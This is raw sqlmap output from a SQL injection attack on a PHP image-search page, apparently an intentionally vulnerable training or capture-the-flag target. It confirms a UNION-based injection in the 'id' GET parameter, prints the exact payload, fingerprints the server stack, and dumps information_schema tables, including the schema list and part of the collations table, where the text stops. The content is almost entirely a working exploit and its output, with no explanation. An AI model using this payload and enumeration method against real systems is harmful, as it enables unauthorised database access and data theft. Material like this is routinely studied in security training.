sqlmap identified the following injection point(s) with a total of 35 HTTP(s) requests:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: page=searchimg&id=1 UNION ALL SELECT CONCAT(0x716a767071,0x4a615a5750424268724f6342597a4a78444b4b43737a596e576470755a426b78754c586d63686f6e,0x717a6b6b71),NULL-- -&Submit=Submit
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.4.6, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
Database: information_schema
Table: KEY_COLUMN_USAGE
[5 entries]
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+
| TABLE_SCHEMA         | TABLE_NAME   | TABLE_CATALOG | COLUMN_NAME   | ORDINAL_POSITION | CONSTRAINT_NAME   | CONSTRAINT_SCHEMA    | CONSTRAINT_CATALOG   | REFERENCED_TABLE_NAME | REFERENCED_COLUMN_NAME | REFERENCED_TABLE_SCHEMA | POSITION_IN_UNIQUE_CONSTRAINT |
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+
| Member_Brute_Force   | db_default   | def           | id            | 1                | PRIMARY           | Member_Brute_Force   | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_Sql_Injection | users        | def           | user_id       | 1                | PRIMARY           | Member_Sql_Injection | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_guestbook     | guestbook    | def           | id_comment    | 1                | PRIMARY           | Member_guestbook     | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_images        | list_images  | def           | id            | 1                | PRIMARY           | Member_images        | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_survey        | vote_dbs     | def           | id_vote       | 1                | PRIMARY           | Member_survey        | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+

Database: information_schema
Table: COLLATIONS
[202 entries]
+-----+---------+------------+-------------+--------------------------+--------------------+
| ID  | SORTLEN | IS_DEFAULT | IS_COMPILED | COLLATION_NAME           | CHARACTER_SET_NAME |
+-----+---------+------------+-------------+--------------------------+--------------------+
| 1   | 1       | Yes        | Yes         | big5_chinese_ci          | big5               |
| 84  | 1       | <blank>    | Yes         | big5_bin                 | big5               |
| 3   | 1       | Yes        | Yes         | dec8_swedish_ci          | dec8               |
| 69  | 1       | <blank>    | Yes         | dec8_bin                 | dec8               |
| 4   | 1       | Yes        | Yes         | cp850_general_ci         | cp850              |
| 80  | 1       | <blank>    | Yes         | cp850_bin                | cp850              |
| 6   | 1       | Yes        | Yes         | hp8_english_ci           | hp8                |
| 72  | 1       | <blank>    | Yes         | hp8_bin                  | hp8                |
| 7   | 1       | Yes        | Yes         | koi8r_general_ci         | koi8r              |
| 74  | 1       | <blank>    | Yes         | koi8r_bin                | koi8r              |
| 5   | 1       | <blank>    | Yes         | latin1_german1_ci        | latin1             |
| 8   | 1       | Yes        | Yes         | latin1_swedish_ci        | latin1             |
| 15  | 1       | <blank>    | Yes         | latin1_danish_ci         | latin1             |
| 31  | 2       | <blank>    | Yes         | latin1_german2_ci        | latin1             |
| 47  | 1       | <blank>    | Yes         | latin1_bin               | latin1             |
| 48  | 1       | <blank>    | Yes         | latin1_general_ci        | latin1             |
| 49  | 1       | <blank>    | Yes         | latin1_general_cs        | latin1             |
| 94  | 1       | <blank>    | Yes         | latin1_spanish_ci        | latin1             |
| 2   | 4       | <blank>    | Yes         | latin2_czech_cs          | latin2             |
| 9   | 1       | Yes        | Yes         | latin2_general_ci        | latin2             |
| 21  | 1       | <blank>    | Yes         | latin2_hungarian_ci      | latin2             |
| 27  | 1       | <blank>    | Yes         | latin2_croatian_ci       | latin2             |
| 77  | 1       | <blank>    | Yes         | latin2_bin               | latin2             |
| 10  | 1       | Yes        | Yes         | swe7_swedish_ci          | swe7               |
| 82  | 1       | <blank>    | Yes         | swe7_bin                 | swe7               |
| 11  | 1       | Yes        | Yes         | ascii_general_ci         | ascii              |
| 65  | 1       | <blank>    | Yes         | ascii_bin                | ascii              |
| 12  | 1       | Yes        | Yes         | ujis_japanese_ci         | ujis               |
| 91  | 1       | <blank>    | Yes         | ujis_bin                 | ujis               |
| 13  | 1       | Yes        | Yes         | sjis_japanese_ci         | sjis               |
